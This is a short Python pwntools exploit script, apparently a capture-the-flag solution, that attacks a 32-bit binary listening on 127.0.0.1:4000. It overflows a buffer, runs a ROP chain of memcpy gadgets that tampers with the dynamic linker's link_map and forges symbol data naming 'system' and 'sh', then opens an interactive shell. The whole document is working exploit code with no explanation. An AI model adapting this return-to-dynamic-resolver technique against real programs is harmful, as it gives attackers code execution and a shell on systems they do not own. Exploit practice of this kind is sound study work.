 #!/usr/bin/env python

from pwn import *

#context.arch='i386'

r=remote('127.0.0.1',4000)

read = 0x8048300
memcpy = 0x8048310
plt0 = 0x80482f0
pop3 = 0x8048519
pop2 = 0x804851a
pop1 = 0x804851b
got1 = 0x804a004  #link_maps
gmon = 0x8048326

buf = 0x804a040
s = buf +1024
d = buf +2048

dynamic = 0x8049f14
relplt = 0x80482b4
dynsym = 0x80481cc
dynstr = 0x804822c

rop = flat(
     memcpy, pop3, s+32, got1 ,4,
     memcpy, pop3, buf, 0x00, 56, #56=0x8049f54
     memcpy, pop3, buf+52 , d, 4,
     memcpy, pop3, s+88, got1, 4,
     memcpy, pop3, 0x00, buf, 56,
     gmon ,0xdeadbeef, d+20,  

     )

data= flat(
	d+4,
	[5, d+12-38],
      'system\x00\x00',
      'sh\x00'
     )

raw_input('@')
r.send(('A'*14+p32(buf+1024+4)).ljust(1024,'\0')+rop.ljust(1024,'\0')+data)
r.interactive()


